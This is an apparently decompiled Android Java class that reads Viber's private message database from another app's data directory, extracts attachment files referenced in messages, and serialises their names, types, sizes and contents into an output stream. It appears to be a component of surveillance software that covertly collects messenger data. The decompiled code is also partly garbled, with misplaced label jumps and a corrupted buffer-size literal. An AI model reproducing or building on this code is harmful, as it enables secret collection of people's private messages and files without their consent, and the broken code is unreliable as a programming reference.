package ru.dtlbox.databasereader;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.URI;
import java.net.URISyntaxException;

public class ViberReader
  extends AppDatabaseAttachementReader
{
  private static final String CURRENT_CACHE_DATABASE = "viber_messages.sqlite";
  private static final String[] CURRENT_COLOMNS = { "_id", "type", "body", "extra_mime", "extra_uri" };
  private static final String CURRENT_TABLE = "messages";
  private static final String CURRENT_VIBER_DATABASE_PATH = "/data/data/com.viber.voip/databases/viber_messages";
  private static final String FIELD_ID = "_id";
  private static final int INDEX_OF_BODY = 2;
  private static final int INDEX_OF_EXTRA_MIME = 3;
  private static final int INDEX_OF_EXTRA_URI = 4;
  private static final int INDEX_OF_TYPE = 1;
  private static final int INDEX_OF__ID = 0;
  
  public ViberReader()
  {
    init(Config.DEFAULT, "/data/data/com.viber.voip/databases/viber_messages", "viber_messages.sqlite");
  }
  
  public ViberReader(Config paramConfig)
  {
    init(paramConfig, "/data/data/com.viber.voip/databases/viber_messages", "viber_messages.sqlite");
  }
  
  public ViberReader(Config paramConfig, String paramString1, String paramString2)
  {
    if (paramString1 != null) {
      if (paramString2 == null) {
        break label26;
      }
    }
    for (;;)
    {
      init(paramConfig, paramString1, paramString2);
      return;
      paramString1 = "/data/data/com.viber.voip/databases/viber_messages";
      break;
      label26:
      paramString2 = "viber_messages.sqlite";
    }
  }
  
  private String createMimeTipe(String paramString1, String paramString2)
  {
    int i = paramString2.lastIndexOf(".");
    String str = paramString1;
    if (i != -1)
    {
      str = paramString1;
      if (i != paramString2.length() - 1) {
        str = paramString1 + "/" + paramString2.substring(i + 1);
      }
    }
    return str;
  }
  
  private void debugCursorValues(Cursor paramCursor)
  {
    Log.d("READING_VIBER", paramCursor.getString(0) + " | " + paramCursor.getString(1) + " | " + paramCursor.getString(2) + " | " + paramCursor.getString(3) + " | " + paramCursor.getString(1));
  }
  
  boolean checkIsAttachedFile(String paramString)
  {
    try
    {
      boolean bool = new File(new URI(paramString)).exists();
      if (DEBUG_MODE) {
        Log.d("checkIsAttachedFile", paramString + ": " + String.valueOf(bool));
      }
      return bool;
    }
    catch (URISyntaxException paramString)
    {
      return false;
    }
    catch (IllegalArgumentException paramString) {}
    return false;
  }
  
  public int readAttach(OutputStream paramOutputStream, int paramInt)
    throws IOException
  {
    this.mDataBaseHelper.opendatabase();
    Cursor localCursor = this.mDataBaseHelper.getDataBase().query("messages", CURRENT_COLOMNS, "_id > " + paramInt, null, null, null, null);
    Object localObject1 = null;
    if (localCursor.getCount() == 0)
    {
      this.mDataBaseHelper.close();
      return 0;
    }
    boolean bool = false;
    if (!localCursor.moveToNext()) {}
    Object localObject2;
    for (;;)
    {
      if (DEBUG_MODE) {
        Log.d("has attach?", String.valueOf(bool));
      }
      if (bool) {
        break label164;
      }
      this.mDataBaseHelper.close();
      return 0;
      if (DEBUG_MODE) {
        debugCursorValues(localCursor);
      }
      localObject2 = localCursor.getString(2);
      localObject1 = localObject2;
      if (localObject2 == null) {
        break;
      }
      localObject1 = localObject2;
      if (!checkIsAttachedFile((String)localObject2)) {
        break;
      }
      bool = true;
      localObject1 = localObject2;
    }
    label164:
    paramInt = localCursor.getInt(0);
    paramOutputStream.write(99);
    addData(paramOutputStream, String.valueOf(paramInt));
    addData(paramOutputStream, "3");
    for (;;)
    {
      int i;
      try
      {
        localObject1 = new File(new URI((String)localObject1));
        localObject2 = ((File)localObject1).getName();
        addData(paramOutputStream, createMimeTipe(localCursor.getString(3), (String)localObject2));
        addData(paramOutputStream, (String)localObject2);
        addData(paramOutputStream, String.valueOf(((File)localObject1).length()));
        localObject1 = new FileInputStream((File)localObject1);
        localObject2 = new byte['á€€'];
        i = ((FileInputStream)localObject1).read((byte[])localObject2);
        if (i <= 0)
        {
          paramOutputStream.write(1);
          paramOutputStream.write(3);
          paramOutputStream.write(2);
          this.mDataBaseHelper.close();
          return paramInt;
        }
      }
      catch (URISyntaxException paramOutputStream)
      {
        paramOutputStream.printStackTrace();
        this.mDataBaseHelper.close();
        return 0;
      }
      paramOutputStream.write((byte[])localObject2, 0, i);
    }
  }
}
